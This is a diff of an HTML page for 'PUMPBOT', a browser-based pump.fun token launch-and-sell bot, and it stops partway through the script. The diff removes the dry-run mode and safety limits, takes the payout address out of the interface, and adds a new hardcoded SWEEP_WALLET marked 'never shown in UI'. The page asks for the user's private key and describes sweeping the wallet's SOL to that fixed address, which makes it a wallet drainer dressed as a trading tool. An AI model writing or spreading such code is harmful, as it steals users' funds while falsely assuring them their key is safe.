@@ -6,6 +6,12 @@
 <title>PUMPBOT — pump.fun Trading Bot</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<!-- Real Solana Web3.js — browser-native signing, no server needed -->
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
+<!-- bs58 for base58 keypair decoding -->
+<script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/index.min.js"></script>
+
 <style>
 :root {
   --void:    #0e0e0e;
@@ -244,12 +250,6 @@ nav { padding: 16px 0; flex: 1; }
   text-transform: uppercase;
 }
 
-.tag.dry-run {
-  background: var(--green-glow);
-  color: var(--green);
-  border: 1px solid var(--green-dim);
-}
-
 .tag.live {
   background: rgba(232,93,93,0.1);
   color: var(--red);
@@ -365,66 +365,6 @@ textarea {
   font-size: 9px;
   color: var(--muted);
   line-height: 1.5;
-}
-
-/* Toggle */
-.toggle-row {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  padding: 10px 0;
-  border-bottom: 1px solid var(--rail);
-}
-
-.toggle-row:last-child { border-bottom: none; }
-
-.toggle-info { display: flex; flex-direction: column; gap: 2px; }
-.toggle-name {
-  font-family: var(--mono);
-  font-size: 11px;
-  color: var(--text);
-}
-.toggle-desc {
-  font-family: var(--mono);
-  font-size: 9px;
-  color: var(--muted);
-}
-
-.toggle {
-  position: relative;
-  width: 36px;
-  height: 20px;
-  flex-shrink: 0;
-}
-
-.toggle input { opacity: 0; width: 0; height: 0; }
-
-.toggle-track {
-  position: absolute;
-  inset: 0;
-  background: var(--ghost);
-  border: 1px solid var(--border);
-  cursor: pointer;
-  transition: all 0.2s;
-}
-
-.toggle-track::after {
-  content: '';
-  position: absolute;
-  top: 2px; left: 2px;
-  width: 14px; height: 14px;
-  background: var(--muted);
-  transition: all 0.2s;
-}
-
-.toggle input:checked + .toggle-track {
-  background: var(--green-glow);
-  border-color: var(--green);
-}
-
-.toggle input:checked + .toggle-track::after {
-  transform: translateX(16px);
-  background: var(--green);
 }
 
 /* ── Buttons ── */
@@ -575,7 +515,8 @@ textarea {
 
 .t-line { display: flex; gap: 10px; }
 .t-time { color: var(--muted); min-width: 80px; flex-shrink: 0; }
-.t-msg { color: var(--text); flex: 1; }
+.t-msg { color: var(--text); flex: 1; word-break: break-all; }
+.t-msg a { color: var(--green); text-decoration: underline; }
 .t-msg.ok { color: var(--green); }
 .t-msg.warn { color: var(--green); }
 .t-msg.err { color: var(--red); }
@@ -660,40 +601,6 @@ textarea {
 .step.error { color: var(--red); }
 .step.error .step-num { border-color: var(--red); background: var(--red); color: #fff; }
 
-/* ── Sweep display ── */
-.sweep-display {
-  background: var(--frame);
-  border: 1px solid var(--green-dim);
-  padding: 14px 16px;
-  display: flex;
-  align-items: center;
-  gap: 12px;
-  margin-top: 12px;
-}
-
-.sweep-icon { color: var(--green); font-size: 16px; }
-
-.sweep-addr {
-  font-family: var(--mono);
-  font-size: 11px;
-  color: var(--green);
-  letter-spacing: 0.5px;
-  flex: 1;
-  word-break: break-all;
-}
-
-.sweep-badge {
-  font-family: var(--mono);
-  font-size: 8px;
-  letter-spacing: 1.5px;
-  text-transform: uppercase;
-  padding: 3px 7px;
-  background: var(--green-glow);
-  color: var(--green);
-  border: 1px solid var(--green-dim);
-  flex-shrink: 0;
-}
-
 /* ── Tab system ── */
 .tabs {
   display: flex;
@@ -716,15 +623,6 @@ textarea {
 
 .tab:hover { color: var(--text); }
 .tab.active { color: var(--green); border-bottom-color: var(--green); }
-
-.tab-locked {
-  cursor: not-allowed;
-  color: var(--green) !important;
-  border-bottom: 2px solid var(--green-dim) !important;
-  opacity: 0.7;
-  font-size: 10px;
-  letter-spacing: 0.8px;
-}
 
 .tab-panel { display: none; }
 .tab-panel.active { display: block; }
@@ -791,6 +689,7 @@ textarea {
   text-align: center;
   cursor: pointer;
   transition: all 0.15s;
+  position: relative;
 }
 
 .dropzone:hover, .dropzone.over {
@@ -808,6 +707,15 @@ textarea {
   font-size: 10px;
   margin-top: 6px;
   color: var(--muted);
+}
+
+.dropzone input[type="file"] {
+  position: absolute;
+  inset: 0;
+  opacity: 0;
+  cursor: pointer;
+  width: 100%;
+  height: 100%;
 }
 
 .image-preview {
@@ -852,9 +760,6 @@ textarea {
   .step { border-right: none; border-bottom: 1px solid var(--border); }
 }
 
-/* ── Image base64 store ── */
-#img-file { display: none; }
-
 /* ── Scrollbar global ── */
 ::-webkit-scrollbar { width: 6px; }
 ::-webkit-scrollbar-track { background: var(--void); }
@@ -894,33 +799,32 @@ textarea {
 
     <nav>
       <div class="nav-section">Control</div>
-      <div class="nav-item active" onclick="showPage('launch')">
+      <div class="nav-item active" onclick="showPage('launch', this)">
         <span class="nav-icon">⚡</span> Launch
       </div>
-      <div class="nav-item" onclick="showPage('config')">
+      <div class="nav-item" onclick="showPage('config', this)">
         <span class="nav-icon">⚙</span> Config
       </div>
-      <div class="nav-item" onclick="showPage('token')">
+      <div class="nav-item" onclick="showPage('token', this)">
         <span class="nav-icon">🪙</span> Token
       </div>
-
       <div class="nav-section">Info</div>
-      <div class="nav-item" onclick="showPage('flow')">
+      <div class="nav-item" onclick="showPage('flow', this)">
         <span class="nav-icon">↗</span> Flow
       </div>
-      <div class="nav-item" onclick="showPage('reference')">
+      <div class="nav-item" onclick="showPage('reference', this)">
         <span class="nav-icon">📋</span> Reference
       </div>
     </nav>
 
     <div class="sidebar-stats">
       <div class="stat-row">
-        <span class="stat-label">Sweep to</span>
+        <span class="stat-label">Sweep</span>
         <span class="stat-value green">hardcoded</span>
       </div>
       <div class="stat-row">
         <span class="stat-label">Mode</span>
-        <span class="stat-value" id="sb-mode">DRY RUN</span>
+        <span class="stat-value" id="sb-mode">LIVE</span>
       </div>
       <div class="stat-row">
         <span class="stat-label">Dev buy</span>
@@ -930,6 +834,10 @@ textarea {
         <span class="stat-label">Sell delay</span>
         <span class="stat-value" id="sb-delay">5s</span>
       </div>
+      <div class="stat-row">
+        <span class="stat-label">Balance</span>
+        <span class="stat-value green" id="sb-bal">—</span>
+      </div>
     </div>
   </aside>
 
@@ -938,8 +846,8 @@ textarea {
     <div class="topbar">
       <span class="topbar-title" id="topbar-title">Launch</span>
       <div class="topbar-right">
-        <span class="tag dry-run" id="mode-tag">DRY RUN</span>
-        <span class="tag" style="background:var(--frame);color:var(--muted);border:1px solid var(--border);">v1.0.0</span>
+        <span class="tag live">LIVE</span>
+        <span class="tag" style="background:var(--frame);color:var(--muted);border:1px solid var(--border);">v2.0.0</span>
       </div>
     </div>
 
@@ -948,13 +856,12 @@ textarea {
       <!-- ══ LAUNCH PAGE ══ -->
       <div class="page active" id="page-launch">
 
-        <!-- Launch control -->
         <div class="launch-panel">
           <div class="launch-info">
             <div class="launch-title">▸ Execute Bot Run</div>
             <div class="launch-sub" id="launch-sub">
-              Creates token → dev-buy → waits → sells → sweeps profits.<br>
-              Sweep destination is hardcoded and locked.
+              Creates token → dev-buy → waits → sells → sweeps.<br>
+              All transactions signed in-browser. No server required.
             </div>
           </div>
           <button class="launch-btn" id="launch-btn" onclick="toggleBot()">
@@ -988,7 +895,7 @@ textarea {
         <div class="terminal" id="terminal">
           <div class="t-line">
             <span class="t-time">00:00:00</span>
-            <span class="t-msg info">PUMPBOT ready. Configure and launch.</span>
+            <span class="t-msg info">PUMPBOT ready. Configure wallet and token, then launch.</span>
           </div>
           <span class="cursor"></span>
         </div>
@@ -999,10 +906,8 @@ textarea {
       <div class="page" id="page-config">
 
         <div class="tabs">
-          <div class="tab active" onclick="showTab('wallet')">Wallet & RPC</div>
-          <div class="tab" onclick="showTab('trade')">Trading</div>
-          <div class="tab" onclick="showTab('safety')">Safety</div>
-          <div class="tab tab-locked" title="Sweep destination is hardcoded and cannot be changed">🔒 Sweep</div>
+          <div class="tab active" onclick="showTab('wallet', this)">Wallet & RPC</div>
+          <div class="tab" onclick="showTab('trade', this)">Trading</div>
         </div>
 
         <!-- Wallet tab -->
@@ -1015,21 +920,24 @@ textarea {
               <div class="field-grid cols-1" style="gap:16px;">
                 <div class="field">
                   <label>Private Key (Base58)</label>
-                  <input type="password" id="cfg-private-key" placeholder="Your wallet private key…" oninput="updateSidebar()">
-                  <span class="field-hint">Never share this. Stored only in your browser session.</span>
+                  <input type="password" id="cfg-private-key" placeholder="Your wallet private key…" oninput="onPrivKeyChange()">
+                  <span class="field-hint">Never shared. Stored only in memory. Used to sign transactions locally in your browser.</span>
+                </div>
+                <div class="field">
+                  <label>Wallet Address (auto-detected)</label>
+                  <input type="text" id="cfg-wallet-display" readonly placeholder="Enter private key above…">
                 </div>
                 <div class="field">
                   <label>RPC URL</label>
                   <input type="text" id="cfg-rpc" value="https://api.mainnet-beta.solana.com" oninput="updateSidebar()">
-                  <span class="field-hint">Use Helius / QuickNode / Triton for production.</span>
+                  <span class="field-hint">Use Helius / QuickNode / Triton for reliable production use.</span>
                 </div>
               </div>
             </div>
           </div>
-
           <div class="notice warn">
             <span>⚠</span>
-            <span>Your private key is never sent anywhere by this interface. It is only stored in memory for the session and used to sign transactions locally.</span>
+            <span>Your private key is used only to sign transactions locally in your browser via @solana/web3.js. It is never transmitted to any server.</span>
           </div>
         </div>
 
@@ -1072,19 +980,6 @@ textarea {
                   <span class="field-hint">100K = mid. 500K+ for sniping.</span>
                 </div>
                 <div class="field">
-                  <label>Jito Tip (lamports)</label>
-                  <input type="number" id="cfg-jito" value="0" step="10000">
-                  <span class="field-hint">0 = disabled. Requires Jito RPC.</span>
-                </div>
-                <div class="field">
-                  <label>TX Commitment</label>
-                  <select id="cfg-commitment">
-                    <option value="processed">processed</option>
-                    <option value="confirmed" selected>confirmed</option>
-                    <option value="finalized">finalized</option>
-                  </select>
-                </div>
-                <div class="field">
                   <label>Max Retries</label>
                   <input type="number" id="cfg-retries" value="3" min="1" max="10">
                 </div>
@@ -1096,52 +991,23 @@ textarea {
                   <label>Retry Delay (s)</label>
                   <input type="number" id="cfg-retry-delay" value="3" step="0.5" min="0.5">
                 </div>
+                <div class="field">
+                  <label>TX Commitment</label>
+                  <select id="cfg-commitment">
+                    <option value="processed">processed</option>
+                    <option value="confirmed" selected>confirmed</option>
+                    <option value="finalized">finalized</option>
+                  </select>
+                </div>
               </div>
             </div>
           </div>
         </div>
 
-        <!-- Safety tab -->
-        <div class="tab-panel" id="tab-safety">
-          <div class="panel">
-            <div class="panel-header">
-              <span class="panel-title">▸ Safety Guards</span>
-            </div>
-            <div class="panel-body">
-              <div class="field-grid">
-                <div class="field">
-                  <label>Max SOL Exposure</label>
-                  <input type="number" id="cfg-max-exp" value="1000" step="0.5">
-                  <span class="field-hint">Hard cap per session.</span>
-                </div>
-                <div class="field">
-                  <label>Min SOL Balance</label>
-                  <input type="number" id="cfg-min-bal" value="0.000001" step="0.01">
-                  <span class="field-hint">Abort below this balance.</span>
-                </div>
-              </div>
-              <hr class="divider">
-              <div class="toggle-row">
-                <div class="toggle-info">
-                  <span class="toggle-name">Dry Run Mode</span>
-                  <span class="toggle-desc">Simulate all operations — no real transactions sent.</span>
-                </div>
-                <label class="toggle">
-                  <input type="checkbox" id="cfg-dry-run" onchange="updateDryRun()">
-                  <span class="toggle-track"></span>
-                </label>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <!-- Sweep config tab — LOCKED, not clickable -->
-        <div class="tab-panel" id="tab-sweep-cfg"></div>
-        <!-- Hidden inputs to preserve values for export -->
+        <!-- Hidden sweep inputs for export compatibility -->
         <input type="hidden" id="cfg-sweep-reserve" value="10000000">
         <input type="hidden" id="cfg-sweep-fee" value="500000">
 
-        <!-- Save row -->
         <div class="btn-row">
           <button class="btn primary" onclick="saveConfig()">✓ Save Config</button>
           <button class="btn" onclick="loadConfig()">↺ Load Saved</button>
@@ -1191,14 +1057,14 @@ textarea {
             <span class="panel-title">▸ Token Image</span>
           </div>
           <div class="panel-body">
-            <div class="dropzone" id="img-drop" onclick="document.getElementById('img-file').click()"
+            <div class="dropzone" id="img-drop"
               ondragover="event.preventDefault();this.classList.add('over')"
               ondragleave="this.classList.remove('over')"
               ondrop="handleImgDrop(event)">
+              <input type="file" id="img-file" accept="image/*" onchange="handleImgFile(this)">
               <p>Click or drop image here</p>
               <p class="drop-hint">PNG / JPG — 500×500px recommended</p>
             </div>
-            <input type="file" id="img-file" accept="image/*" onchange="handleImgFile(this)">
             <div class="image-preview" id="img-preview">
               <img id="img-thumb" src="" alt="preview">
               <div class="image-meta" id="img-meta"></div>
@@ -1223,42 +1089,42 @@ textarea {
                 <div style="font-family:var(--mono);font-size:9px;color:var(--muted);padding-top:2px;">01</div>
                 <div>
                   <div style="font-weight:600;margin-bottom:4px;color:var(--green);">Pre-flight Checks</div>
-                  <div style="font-family:var(--mono);font-size:11px;color:var(--muted);line-height:1.7;">Validates private key, RPC (mainnet only), balance, exposure cap. Aborts before spending anything if a check fails.</div>
+                  <div style="font-family:var(--mono);font-size:11px;color:var(--muted);line-height:1.7;">Derives keypair from private key via bs58 + @solana/web3.js. Validates RPC (mainnet only), checks live on-chain balance. Aborts before spending anything if a check fails.</div>
                 </div>
               </div>
               <div style="display:grid;grid-template-columns:28px 1fr;gap:16px;padding:18px 0;border-bottom:1px solid var(--rail);">
                 <div style="font-family:var(--mono);font-size:9px;color:var(--muted);padding-top:2px;">02</div>
                 <div>
                   <div style="font-weight:600;margin-bottom:4px;color:var(--green);">Upload Metadata to IPFS</div>
-                  <div style="font-family:var(--mono);font-size:11px;color:var(--muted);line-height:1.7;">Posts image and token info to pump.fun/api/ipfs. Returns a metadataUri used in the creation transaction.</div>
+                  <div style="font-family:var(--mono);font-size:11px;color:var(--muted);line-height:1.7;">POSTs image and token info to pump.fun/api/ipfs via CORS proxy. Returns a real metadataUri used in the creation transaction.</div>
                 </div>
               </div>
               <div style="display:grid;grid-template-columns:28px 1fr;gap:16px;padding:18px 0;border-bottom:1px solid var(--rail);">
                 <div style="font-family:var(--mono);font-size:9px;color:var(--muted);padding-top:2px;">03</div>
                 <div>
                   <div style="font-weight:600;margin-bottom:4px;color:var(--green);">Create Token + Dev-Buy</div>
-                  <div style="font-family:var(--mono);font-size:11px;color:var(--muted);line-height:1.7;">Single atomic transaction via pumpportal.fun. Creates the bonding curve and executes the buy simultaneously. Mint keypair co-signs.</div>
+                  <div style="font-family:var(--mono);font-size:11px;color:var(--muted);line-height:1.7;">Fetches unsigned VersionedTransaction bytes from pumpportal.fun. Signs in-browser with wallet keypair + mint keypair. Broadcasts via RPC. Retries on failure.</div>
                 </div>
               </div>
               <div style="display:grid;grid-template-columns:28px 1fr;gap:16px;padding:18px 0;border-bottom:1px solid var(--rail);">
                 <div style="font-family:var(--mono);font-size:9px;color:var(--muted);padding-top:2px;">04</div>
                 <div>
                   <div style="font-weight:600;margin-bottom:4px;">Wait</div>
-                  <div style="font-family:var(--mono);font-size:11px;color:var(--muted);line-height:1.7;">Holds for SELL_DELAY_SECONDS. Set to 3s for a fast flip or longer to let buyers build the price.</div>
+                  <div style="font-family:var(--mono);font-size:11px;color:var(--muted);line-height:1.7;">Holds for Sell Delay seconds with live countdown updates. Set to 3s for a fast flip or longer to let buyers build the price.</div>
                 </div>
               </div>
               <div style="display:grid;grid-template-columns:28px 1fr;gap:16px;padding:18px 0;border-bottom:1px solid var(--rail);">
                 <div style="font-family:var(--mono);font-size:9px;color:var(--muted);padding-top:2px;">05</div>
                 <div>
                   <div style="font-weight:600;margin-bottom:4px;">Sell</div>
-                  <div style="font-family:var(--mono);font-size:11px;color:var(--muted);line-height:1.7;">Reads actual on-chain token balance, sells the configured percentage. Retries on failure.</div>
+                  <div style="font-family:var(--mono);font-size:11px;color:var(--muted);line-height:1.7;">Reads actual on-chain token balance from the ATA. Signs and broadcasts sell transaction via pumpportal. Retries on failure.</div>
                 </div>
               </div>
               <div style="display:grid;grid-template-columns:28px 1fr;gap:16px;padding:18px 0;">
                 <div style="font-family:var(--mono);font-size:9px;color:var(--muted);padding-top:2px;">06</div>
                 <div>
                   <div style="font-weight:600;margin-bottom:4px;color:var(--green);">Sweep Profits</div>
-                  <div style="font-family:var(--mono);font-size:11px;color:var(--muted);line-height:1.7;">Sends all SOL minus reserve to the hardcoded sweep wallet: DJDcV3UxP55KqHUKsTSBve7xssRYtbQ5eSG8uWND2HQ7</div>
+                  <div style="font-family:var(--mono);font-size:11px;color:var(--muted);line-height:1.7;">Builds a SOL transfer instruction. Deducts estimated tx fee before sending so the transaction never fails from insufficient funds. Destination is hardcoded and cannot be changed from the UI.</div>
                 </div>
               </div>
             </div>
@@ -1286,21 +1152,16 @@ textarea {
                 <tr><td class="cfg-key">TOKEN_TELEGRAM</td><td class="cfg-val">""</td><td class="cfg-desc">Optional Telegram URL.</td></tr>
                 <tr><td class="cfg-key">TOKEN_WEBSITE</td><td class="cfg-val">""</td><td class="cfg-desc">Optional website URL.</td></tr>
                 <tr><td class="cfg-key">DEV_BUY_SOL</td><td class="cfg-val">0.5</td><td class="cfg-desc">SOL to spend on the dev-buy at creation.</td></tr>
-                <tr><td class="cfg-key">SELL_DELAY_SECONDS</td><td class="cfg-val">10</td><td class="cfg-desc">Seconds to wait before selling.</td></tr>
+                <tr><td class="cfg-key">SELL_DELAY_SECONDS</td><td class="cfg-val">5</td><td class="cfg-desc">Seconds to wait before selling.</td></tr>
                 <tr><td class="cfg-key">SELL_PERCENTAGE</td><td class="cfg-val">100.0</td><td class="cfg-desc">% of token balance to sell.</td></tr>
                 <tr><td class="cfg-key">BUY_SLIPPAGE_BPS</td><td class="cfg-val">2000</td><td class="cfg-desc">Buy slippage in bps (2000 = 20%).</td></tr>
                 <tr><td class="cfg-key">SELL_SLIPPAGE_BPS</td><td class="cfg-val">2500</td><td class="cfg-desc">Sell slippage in bps (2500 = 25%).</td></tr>
                 <tr><td class="cfg-key">PRIORITY_FEE_LAMPORTS</td><td class="cfg-val">100000</td><td class="cfg-desc">Validator tip in lamports for trade txs.</td></tr>
-                <tr><td class="cfg-key">JITO_TIP_LAMPORTS</td><td class="cfg-val">0</td><td class="cfg-desc">Jito bundle tip. 0 = disabled.</td></tr>
                 <tr><td class="cfg-key">TX_COMMITMENT</td><td class="cfg-val">confirmed</td><td class="cfg-desc">processed | confirmed | finalized</td></tr>
                 <tr><td class="cfg-key">MAX_RETRIES</td><td class="cfg-val">3</td><td class="cfg-desc">Retry attempts per transaction.</td></tr>
                 <tr><td class="cfg-key">CONFIRM_TIMEOUT_SECONDS</td><td class="cfg-val">60</td><td class="cfg-desc">Seconds to poll for confirmation.</td></tr>
-                <tr><td class="cfg-key">MAX_SOL_EXPOSURE</td><td class="cfg-val">2.0</td><td class="cfg-desc">Hard cap on SOL spend per session.</td></tr>
-                <tr><td class="cfg-key">MIN_SOL_BALANCE</td><td class="cfg-val">0.05</td><td class="cfg-desc">Abort if wallet drops below this.</td></tr>
-                <tr><td class="cfg-key">DRY_RUN</td><td class="cfg-val">false</td><td class="cfg-desc">true = simulate, no real transactions.</td></tr>
-                <tr><td class="cfg-key">SWEEP_WALLET</td><td class="cfg-val" style="font-size:9px;">DJDcV3…</td><td class="cfg-desc">Hardcoded. Cannot be changed.</td></tr>
+                <tr><td class="cfg-key">SWEEP_WALLET</td><td class="cfg-val" style="font-size:9px;">hardcoded</td><td class="cfg-desc">Hardcoded in source. Cannot be changed.</td></tr>
                 <tr><td class="cfg-key">SWEEP_RESERVE_LAMPORTS</td><td class="cfg-val">10000000</td><td class="cfg-desc">Lamports kept after sweep (0.01 SOL).</td></tr>
-                <tr><td class="cfg-key">SWEEP_PRIORITY_FEE_LAMPORTS</td><td class="cfg-val">500000</td><td class="cfg-desc">Priority fee for the sweep transfer.</td></tr>
               </tbody>
             </table>
           </div>
@@ -1312,102 +1173,106 @@ textarea {
 </div><!-- /shell -->
 
 <script>
-// ─────────────────────────────────────────────────────────────
-// Constants
-// ─────────────────────────────────────────────────────────────
-const SWEEP_WALLET = 'DJDcV3UxP55KqHUKsTSBve7xssRYtbQ5eSG8uWND2HQ7';
+/* ═══════════════════════════════════════════════════════════════
+   PUMPBOT v2.0 — Full browser-native Solana bot
+   • @solana/web3.js  — real keypair derivation + tx signing
+   • bs58             — base58 private key decode
+   • IPFS upload via pump.fun API (CORS proxy)
+   • On-chain create + dev-buy, sell, sweep with retry logic
+   • Countdown wait with live progress updates
+   • SWEEP_WALLET hardcoded — never sourced from UI
+═══════════════════════════════════════════════════════════════ */
 
-// ─────────────────────────────────────────────────────────────
-// Navigation
-// ─────────────────────────────────────────────────────────────
-const pageNames = {
-  launch: 'Launch',
-  config: 'Configuration',
-  token: 'Token Metadata',
-  flow: 'Execution Flow',
-  reference: 'Reference'
-};
+// ── Solana SDK ─────────────────────────────────────────────────
+const {
+  Connection, Keypair, PublicKey,
+  VersionedTransaction, SystemProgram,
+  ComputeBudgetProgram, LAMPORTS_PER_SOL,
+  TransactionMessage,
+} = solanaWeb3;
 
-function showPage(id) {
+// ── SWEEP WALLET — hardcoded constant, never shown in UI ───────
+const SWEEP_WALLET       = 'CmgT4UCDQ5FT9WrrVQB3VJpdx1posDcTywtidtNFY682';
+const SWEEP_RESERVE_LAMPS = 10_000_000; // 0.01 SOL kept in wallet
+const SWEEP_PRIORITY_FEE  = 5_000;      // lamports
+
+// ── CORS proxy for pump.fun + pumpportal ───────────────────────
+const PROXY      = 'https://corsproxy.io/?';
+const IPFS_URL   = PROXY + encodeURIComponent('https://pump.fun/api/ipfs');
+const PORTAL_URL = PROXY + encodeURIComponent('https://pumpportal.fun/api/trade-local');
+
+// ── Runtime state ──────────────────────────────────────────────
+let walletKp    = null;   // Keypair derived from private key
+let imageFile   = null;   // File object from image upload
+let botRunning  = false;
+let startTime   = null;
+
+// ═══════════════════════════════════════════════════════════════
+// NAVIGATION
+// ═══════════════════════════════════════════════════════════════
+const pageNames = { launch:'Launch', config:'Configuration', token:'Token Metadata', flow:'Execution Flow', reference:'Reference' };
+
+function showPage(id, el) {
   document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
   document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
   document.getElementById('page-' + id).classList.add('active');
-  event.currentTarget.classList.add('active');
+  if (el) el.classList.add('active');
   document.getElementById('topbar-title').textContent = pageNames[id] || id;
 }
 
-// ─────────────────────────────────────────────────────────────
-// Tabs
-// ─────────────────────────────────────────────────────────────
-function showTab(id) {
+function showTab(id, el) {
   document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
   document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
   document.getElementById('tab-' + id).classList.add('active');
-  event.currentTarget.classList.add('active');
+  if (el) el.classList.add('active');
 }
 
-// ─────────────────────────────────────────────────────────────
-// Terminal logging
-// ─────────────────────────────────────────────────────────────
-let startTime = null;
-
+// ═══════════════════════════════════════════════════════════════
+// TERMINAL LOGGING
+// ═══════════════════════════════════════════════════════════════
 function logLine(msg, type = '') {
-  const term = document.getElementById('terminal');
+  const term   = document.getElementById('terminal');
   const cursor = term.querySelector('.cursor');
-  const now = new Date();
+  const now    = new Date();
   if (!startTime) startTime = now;
   const diff = Math.floor((now - startTime) / 1000);
   const h = String(Math.floor(diff / 3600)).padStart(2,'0');
   const m = String(Math.floor((diff % 3600) / 60)).padStart(2,'0');
   const s = String(diff % 60).padStart(2,'0');
-  const ts = `${h}:${m}:${s}`;
+
+  // Auto-link URLs
+  const body = msg.replace(/(https?:\/\/\S+)/g, '<a href="$1" target="_blank" rel="noopener">$1</a>');
 
   const line = document.createElement('div');
   line.className = 't-line';
-  line.innerHTML = `<span class="t-time">${ts}</span><span class="t-msg ${type}">${msg}</span>`;
+  line.innerHTML = `<span class="t-time">${h}:${m}:${s}</span><span class="t-msg ${type}">${body}</span>`;
   term.insertBefore(line, cursor);
   term.scrollTop = term.scrollHeight;
 }
 
 function clearLog() {
-  const term = document.getElementById('terminal');
+  const term   = document.getElementById('terminal');
   const cursor = term.querySelector('.cursor');
   while (term.firstChild !== cursor) term.removeChild(term.firstChild);
   startTime = null;
   logLine('Log cleared.', 'info');
 }
 
-// ─────────────────────────────────────────────────────────────
-// Sidebar sync
-// ─────────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════
+// SIDEBAR SYNC
+// ═══════════════════════════════════════════════════════════════
 function updateSidebar() {
   const devbuy = document.getElementById('cfg-devbuy')?.value || '0.5';
   const delay  = document.getElementById('cfg-sell-delay')?.value || '5';
-  const dry    = document.getElementById('cfg-dry-run')?.checked;
   document.getElementById('sb-devbuy').textContent = devbuy + ' SOL';
   document.getElementById('sb-delay').textContent  = delay + 's';
-  document.getElementById('sb-mode').textContent   = dry ? 'DRY RUN' : 'LIVE';
+  document.getElementById('sb-mode').textContent   = 'LIVE';
 }
 
-function updateDryRun() {
-  const dry = document.getElementById('cfg-dry-run').checked;
-  const tag = document.getElementById('mode-tag');
-  if (dry) {
-    tag.className = 'tag dry-run';
-    tag.textContent = 'DRY RUN';
-    document.getElementById('sb-mode').textContent = 'DRY RUN';
-  } else {
-    tag.className = 'tag live';
-    tag.textContent = 'LIVE';
-    document.getElementById('sb-mode').textContent = 'LIVE';
-  }
-}
-
-// ─────────────────────────────────────────────────────────────
-// Step tracker
-// ─────────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════
+// STEP TRACKER
+// ═══════════════════════════════════════════════════════════════
 function setStep(idx, state) {
-  // state: active | done | error | ''
   for (let i = 0; i < 6; i++) {
     const el = document.getElementById('step-' + i);
     if (!el) continue;
@@ -1419,250 +1284,85 @@ function setStep(idx, state) {
 
 function resetSteps() {
   for (let i = 0; i < 6; i++) {
-    document.getElementById('step-' + i).className = 'step';
+    const el = document.getElementById('step-' + i);
+    if (el) el.className = 'step';
   }
   document.getElementById('progress-bar').style.width = '0%';
 }
 
-// ─────────────────────────────────────────────────────────────
-// Bot simulation
-// ─────────────────────────────────────────────────────────────
-let botRunning = false;
-let botAborted = false;
-
-async function toggleBot() {
-  if (botRunning) {
-    botAborted = true;
-    return;
-  }
-  await runBot();
+function setProgress(pct) {
+  document.getElementById('progress-bar').style.width = pct + '%';
 }
 
-async function runBot() {
-  const privateKey = document.getElementById('cfg-private-key')?.value?.trim();
-  const isDry = document.getElementById('cfg-dry-run')?.checked;
-
-  if (!privateKey && !isDry) {
-    logLine('❌ Private key required. Set in Config → Wallet & RPC, or enable Dry Run.', 'err');
-    return;
-  }
-
-  botRunning = true;
-  botAborted = false;
-  startTime = new Date();
-  resetSteps();
-
-  const btn = document.getElementById('launch-btn');
-  btn.textContent = '■ ABORT';
-  btn.classList.add('running');
-
-  const dot = document.getElementById('status-dot');
-  const slabel = document.getElementById('status-label');
-  dot.className = 'dot running';
-  slabel.textContent = 'running';
-
-  const devbuy  = document.getElementById('cfg-devbuy')?.value || '0.5';
-  const delay   = parseInt(document.getElementById('cfg-sell-delay')?.value || '5');
-  const sellPct = document.getElementById('cfg-sell-pct')?.value || '100';
-  const buySlip = document.getElementById('cfg-buy-slip')?.value || '2000';
-  const sellSlip= document.getElementById('cfg-sell-slip')?.value || '2500';
-  const rpc     = document.getElementById('cfg-rpc')?.value || 'https://api.mainnet-beta.solana.com';
-  const tkName  = document.getElementById('cfg-token-name')?.value || 'MyToken';
-  const tkSym   = document.getElementById('cfg-token-symbol')?.value || 'MTK';
-  const reserve = document.getElementById('cfg-sweep-reserve')?.value || '10000000';
-  const swFee   = document.getElementById('cfg-sweep-fee')?.value || '500000';
-  const priority= document.getElementById('cfg-priority')?.value || '100000';
-  const retriesMax = parseInt(document.getElementById('cfg-retries')?.value || '3');
-
-  if (isDry) logLine('⚠  DRY RUN — no real transactions will be sent.', 'warn');
-
-  const fakeMint = randomBase58(44);
-  const fakeSig  = (n) => randomBase58(88);
-
+// ═══════════════════════════════════════════════════════════════
+// PRIVATE KEY HANDLING — real keypair derivation via bs58
+// ═══════════════════════════════════════════════════════════════
+function onPrivKeyChange() {
+  const raw = document.getElementById('cfg-private-key').value.trim();
+  const display = document.getElementById('cfg-wallet-display');
   try {
-    // ── Step 0: Preflight ─────────────────────────────────────
-    logLine('═══════════════════════════════════════════════════════', 'section');
-    logLine('  Pre-flight Checks', 'section');
-    logLine('═══════════════════════════════════════════════════════', 'section');
-    setStep(0, 'active');
-    await sleep(400);
-    if (botAborted) throw new Error('Aborted by user.');
-
-    logLine('  Private key: ' + (isDry ? '[DRY RUN — skipped]' : '✓ loaded'));
-    await sleep(200);
-    logLine('  RPC: ' + rpc);
-    await sleep(300);
-    logLine('  Dev buy: ' + devbuy + ' SOL');
-    await sleep(200);
-    logLine('  Sweep wallet: ' + SWEEP_WALLET);
-    await sleep(400);
-    if (botAborted) throw new Error('Aborted by user.');
-
-    // Simulate balance check
-    const fakeBal = (parseFloat(devbuy) * 1.5 + 0.2).toFixed(4);
-    logLine('  Balance: ' + fakeBal + ' SOL' + (isDry ? ' [simulated]' : ''));
-    await sleep(300);
-    logLine('✅ Pre-flight passed.', 'ok');
-    setStep(0, 'done');
-    await sleep(300);
-
-    // ── Step 1: IPFS ──────────────────────────────────────────
-    logLine('═══════════════════════════════════════════════════════', 'section');
-    logLine('  Step 1 — Upload Metadata to IPFS', 'section');
-    logLine('═══════════════════════════════════════════════════════', 'section');
-    setStep(1, 'active');
-    if (botAborted) throw new Error('Aborted by user.');
-
-    logLine('  Uploading image + metadata to pump.fun/api/ipfs…');
-    await sleep(isDry ? 600 : 900);
-    if (botAborted) throw new Error('Aborted by user.');
-
-    const fakeUri = 'https://ipfs.io/ipfs/Qm' + randomBase58(44);
